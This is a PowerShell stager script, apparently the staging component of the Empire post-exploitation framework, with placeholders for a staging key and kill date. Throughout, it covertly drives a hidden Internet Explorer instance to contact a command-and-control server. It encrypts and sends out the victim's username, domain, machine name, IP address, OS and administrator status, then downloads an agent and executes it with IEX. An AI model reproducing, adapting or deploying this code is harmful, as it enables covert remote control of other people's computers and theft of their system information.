function Start-Negotiate {
    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')

    function ConvertTo-RC4ByteStream {
        Param ($RCK, $In)
        begin {
            [Byte[]] $S = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $S[$_], $S[$J] = $S[$J], $S[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $S[$I]) % 256;
                $S[$I], $S[$J] = $S[$J], $S[$I];
                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
            }
        }
    }

    function Decrypt-Bytes {
        param ($Key, $In)
        if($In.Length -gt 32) {
            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
            $e=[System.Text.Encoding]::ASCII;
            
            $Mac = $In[-10..-1];
            $In = $In[0..($In.length - 11)];
            $hmac.Key = $e.GetBytes($Key);
            $Expected = $hmac.ComputeHash($In)[0..9];
            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
                return;
            }

            
            $IV = $In[0..15];
            try {
                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            }
            catch {
                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
            }
            $AES.Mode = "CBC";
            $AES.Key = $e.GetBytes($Key);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
        }
    }

    
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");

    
    $ErrorActionPreference = "SilentlyContinue";
    $e=[System.Text.Encoding]::ASCII;
    $customHeaders = "";
    $SKB=$e.GetBytes($SK);
    
    
    try {
        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    }
    catch {
        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
    }
    $IV = [byte] 0..255 | Get-Random -count 16;
    $AES.Mode="CBC";
    $AES.Key=$SKB;
    $AES.IV = $IV;

    $hmac = New-Object System.Security.Cryptography.HMACSHA256;
    $hmac.Key = $SKB;

    $csp = New-Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
    
    $rk=$rs.ToXmlString($False);

    
    $ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);

    
    $ib=$e.getbytes($rk);

    
    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
    $eb=$eb+$hmac.ComputeHash($eb)[0..9];

    
    
    if(-not $IE) {
        $IE=New-Object -COM InternetExplorer.Application;
        $ie.Silent = $True;
        $IE.visible = $False;
    }

    if ($customHeaders -ne "") {
        
	    
        if ($customHeaders.Contains("Host: ")) {
                $IE.navigate2($s,14,0,$Null,$Null);
                while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
        }
    }
    
    
    
    
    
    
    
    $IV=[BitConverter]::GetBytes($(Get-Random));
    $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
    $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
    $rc4p = $IV + $rc4p + $eb;

    
    $bytes=$e.GetBytes([System.Convert]::ToBase64String($rc4p));
    $IE.navigate2($s+"/index.jsp", 14, 0, $bytes, $customHeaders);
    while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
    $html = $IE.document.GetType().InvokeMember("body", [System.Reflection.BindingFlags]::GetProperty, $Null, $IE.document, $Null).InnerHtml;

    try {
        $raw = [System.Convert]::FromBase64String($html);
    }
    catch {$Null};

    
    $de=$e.GetString($rs.decrypt($raw,$false));
    
    
    $nonce=$de[0..15] -join '';
    $key=$de[16..$de.length] -join '';

    
    $nonce=[String]([long]$nonce + 1);

    
    try {
        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    }
    catch {
        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
    }
    $IV = [byte] 0..255 | Get-Random -Count 16;
    $AES.Mode="CBC";
    $AES.Key=$e.GetBytes($key);
    $AES.IV = $IV;

    
    $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);

    
    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
    if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
    $i+="|$ip";

    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];

    
    if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
    else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}

    
    $n=[System.Diagnostics.Process]::GetCurrentProcess();
    $i+='|'+$n.ProcessName+'|'+$n.Id;
    
    $i += "|powershell|" + $PSVersionTable.PSVersion.Major;

    
    $ib2=$e.getbytes($i);
    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
    $hmac.Key = $e.GetBytes($key);
    $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];

    
    
    
    
    
    
    $IV2=[BitConverter]::GetBytes($(Get-Random));
    $data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
    $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
    $rc4p2 = $IV2 + $rc4p2 + $eb2;

    $bytes=$e.GetBytes([System.Convert]::ToBase64String($rc4p2));
    $IE.navigate2($s+"/index.php", 14, 0, $bytes, $customHeaders);
    while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
    $html = $IE.document.GetType().InvokeMember("body", [System.Reflection.BindingFlags]::GetProperty, $Null, $IE.document, $Null).InnerHtml;
    try {
        $raw = [System.Convert]::FromBase64String($html);
    }
    catch {$Null};

    
    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );

    
    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
    [GC]::Collect();

    
    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE";
}

Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
